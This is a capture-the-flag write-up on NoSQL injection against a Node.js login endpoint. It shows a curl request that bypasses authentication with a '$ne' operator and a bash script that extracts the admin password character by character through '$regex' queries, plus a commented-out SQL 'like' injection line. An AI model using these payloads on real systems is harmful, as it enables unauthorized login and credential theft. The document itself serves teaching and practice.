
# No Sequel 

## The challenge

A lot of people told me about SQL injection. So, i've been thinking: If I use NoSQL, I'm protected against injection, right? RIGHT?

http://54.251.224.195:5000/

```javascript
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: false }));

app.post('/login', (req, res) => {
  const user = req.body.username;
  const pass = req.body.password;

  if (!user || !pass){
    return res.send("One or more fields were not provided.");
  }
  const query = {
    username: user,
    password: pass
  }

  User.findOne(query, function (err, user) {
    if (!user){
      res.send("Wrong username or password");
      return
    }

    res.send(process.env.FLAG);
  });
});
```

## Writeup

We can see there is no filer it the variables or the query.
So we can inject a NoSQL query:
```bash
curl 'http://54.251.224.195:5000/login' -H 'Content-Type: application/json'   -H 'Referer: http://54.251.224.195:5000/login'   --data '{
    "username": "admin",
    "password": {"$ne": 0}
}'
```

the return : axactf{n05ql_d0e5_n07_m34n_n0_1nj3ct10n}



# No Sequel: Second Impact

## The challenge

So, ok, maybe my first thought about injection wasn't good: NoSQL doesn't mean that i'm protected. So, this time, i won't make the same error twice. I'll check the password! Note: both No Sequel challenges are using the same DB / data

http://54.251.224.195:5000/

```javascript
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: false }));
app.post('/hard-login', (req, res) => {
  const pass = req.body.password;

  if (!pass){
    return res.send("You need to provide the password.");
  }
  const query = {
    username: 'admin'
  }

  User.findOne(query, function (err, user) {
    if (!user){
      res.send("Wrong username or password");
      return
    }

    if (user.password === pass) {
      res.send(process.env.HARDFLAG);
    } else {
      res.send("Wrong password");
      return
    }
  });
});
```

## Writeup

We juste need the password of the admin user from the previous challenge.
We 're going to craft the request to find the  password of the admin user character by character. Using the same technique than SQL challenges.
Crafter request:
```bash
curl 'http://54.251.224.195:5000/login' -H 'Content-Type: application/json'   -H 'Referer: http://54.251.224.195:5000/login'   --data '{
    "username": "admin",
    "password": {"$regex": "^a.*"}, "$options": "m"
}'
```

So doing the same script than in SQL challenge:

```bash
#!/bin/bash    
password=""
passwordreel=""
echo $cmd

arrayName=('a' 'b' 'c' 'd' 'e' 'f' 'g' 'h' 'i' 'j' 'k' 'l' 'm' 'n' 'o' 'p' 'q' 'r' 's' 't' 'u' 'v' 'w' 'x' 'y' 'z' 'A' 'B' 'C' 'D' 'E' 'F' 'G' 'H' 'I' 'J' 'K' 'L' 'M' 'N' 'O' 'P' 'Q' 'R' 'S' 'T' 'U' 'V' 'W' 'X' 'Y' 'Z' '0' '1' '2' '3' '4' '5' '6' '7' '8' '9')
while true; do
a=0
for i in "${arrayName[@]}"; do
password="$passwordreel$i"
echo $password
#cmd=$(curl 'http://54.254.115.115:5001/'  -H 'Connection: keep-alive'   -H 'Cache-Control: max-age=0'   -H 'Upgrade-Insecure-Requests: 1'   -H 'Origin: http://54.254.115.115:5001'   -H 'Content-Type: application/x-www-form-urlencoded'   -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36'   -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'   -H 'Referer: http://54.254.115.115:5001/'   -H 'Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7'   --data 'username=flag1" and password+like+"'"$password"'%fuzh0='   --compressed   --insecure)
cmd=$(curl 'http://54.251.224.195:5000/login' -H 'Content-Type: application/json'   -H 'Referer: http://54.251.224.195:5000/login'   --data '{
    "username": "admin",
    "password": {"$regex": "^'$password'.*"}, "$options": "m"
}')
echo $cmd
if [[ $cmd == *"Wrong"* ]]; then
  a=$a+1;
  
else
  passwordreel=$password
  echo $password
  break
fi
done
echo $password

done

```

We find : m0r3c0mpl1c4t3d57uff
curl 'http://54.251.224.195:5000/hard-login'  --data-raw 'password=m0r3c0mpl1c4t3d57uff' 

and we get : #axactf{th1s_1s_called_bl1nd_5ql_1nj3ct10n}